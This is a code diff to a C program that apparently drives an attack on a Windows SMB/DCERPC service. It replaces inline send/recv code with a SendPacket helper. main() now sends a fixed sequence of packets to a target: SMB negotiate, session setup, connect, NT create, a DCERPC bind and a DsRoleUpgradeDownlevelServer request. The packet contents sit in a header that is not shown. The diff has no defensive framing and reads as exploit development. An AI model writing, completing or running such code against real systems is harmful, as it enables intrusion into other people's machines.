@@ -5,6 +5,8 @@
 
 #include "requests.h"
 
+void SendPacket(int socket, char* buffer, size_t bufferLen);
+
 
 int main()
 {
@@ -66,59 +68,15 @@ int main()
 	}
 
 
-	////set local and target IP in packets
-	//memcpy(&smbNegotiateProtocol[26], localIP, strlen(localIP) -1);
-	//memcpy(&smbNegotiateProtocol[30], targetIP, strlen(targetIP) -1);
-	//memcpy(&smbSessionSetupAndX[26], localIP, strlen(localIP -1));
-	//memcpy(&smbSessionSetupAndX[30], targetIP, strlen(targetIP) -1);
-
-	////set local and target port in packets
-	//memcpy(&smbNegotiateProtocol[34], &localPort, sizeof(localPort));
-	//memcpy(&smbNegotiateProtocol[36], &targetPort, sizeof(targetPort));
-	//memcpy(&smbSessionSetupAndX[34], &localPort, sizeof(localPort));
-	//memcpy(&smbSessionSetupAndX[36], &targetPort, sizeof(targetPort));
-
-	int bytesSent = 0;
-	int bytesRecvieved = 0;
-
-	bytesSent = send(sock, smbNegotiateProtocol, sizeof(smbNegotiateProtocol), 0);
-	if (bytesSent <= 0)
-	{
-		printf("[*] smbNegotiateProtocol send failed. targetIP: %s, port: %i\r\n", targetIP, targetPort);
-	}
-
-	printf("[*] sent %i bytes to %s\r\n", bytesSent, targetIP);
-
-	bytesRecvieved = recv(sock, (char*)recvBuff, sizeof(recvBuff), 0);
-	if (bytesRecvieved <= 0)
-	{
-		printf("recv failed or connection closed: %d\n", WSAGetLastError());
-		closesocket(sock);
-		WSACleanup();
-		return 1;
-	}
-
-	printf("[*] recieved %i bytes from %s\r\n", bytesSent, targetIP);
+	SendPacket(sock, (char*)SMB_NEGOTIATE_REQUEST_PACKET, sizeof(SMB_NEGOTIATE_REQUEST_PACKET));
+	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_1_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_1_PACKET));
+	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_2_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_2_PACKET));
+	SendPacket(sock, (char*)SMB_CONNECT_ANDX_REQUEST_PACKET, sizeof(SMB_CONNECT_ANDX_REQUEST_PACKET));
+	SendPacket(sock, (char*)SMB_NT_CREATE_ANDX_REQUEST_PACKET, sizeof(SMB_NT_CREATE_ANDX_REQUEST_PACKET));
+	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
+	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET));
 
 
-	bytesSent = send(sock, smbSessionSetupAndX, sizeof(smbSessionSetupAndX), 0);
-	if (bytesSent <= 0)
-	{
-		printf("[*] smbSessionSetupAndX send failed. targetIP: %s, port: %i\r\n", targetIP, targetPort);
-	}
-
-	printf("[*] sent %i bytes to %s\r\n", bytesSent, targetIP);
-
-	bytesRecvieved = recv(sock, (char*)recvBuff, sizeof(recvBuff), 0);
-	if (bytesRecvieved <= 0)
-	{
-		printf("recv failed or connection closed: %d\n", WSAGetLastError());
-		closesocket(sock);
-		WSACleanup();
-		return 1;
-	}
-
-	printf("[*] recieved %i bytes from %s\r\n", bytesRecvieved, targetIP);
 
 
 
@@ -134,4 +92,39 @@ int main()
 	}
 
 	return 1;
+}
+
+
+
+void SendPacket(int socket, char* buffer, size_t bufferLen)
+{
+
+	int bytesSent = 0;
+	int bytesRecieved = 0;
+	unsigned char recvBuff[1500] = { 0 };
+
+	bytesSent = send(socket, buffer, bufferLen, 0);
+	if (bytesSent <= 0)
+	{
+		printf("[*] send failed.\r\n");
+		printf("recv failed or connection closed: %d\n", WSAGetLastError());
+		closesocket(socket);
+		WSACleanup();
+		return;
+
+
+	}
+	printf("[*] sent %i bytes\r\n", bytesSent);
+
+	bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
+	if (bytesRecieved <= 0)
+	{
+		printf("recv failed or connection closed: %d\n", WSAGetLastError());
+		closesocket(socket);
+		WSACleanup();
+		return;
+	}
+
+	printf("[*] recieved %i bytes\r\n", bytesRecieved);
+
 }
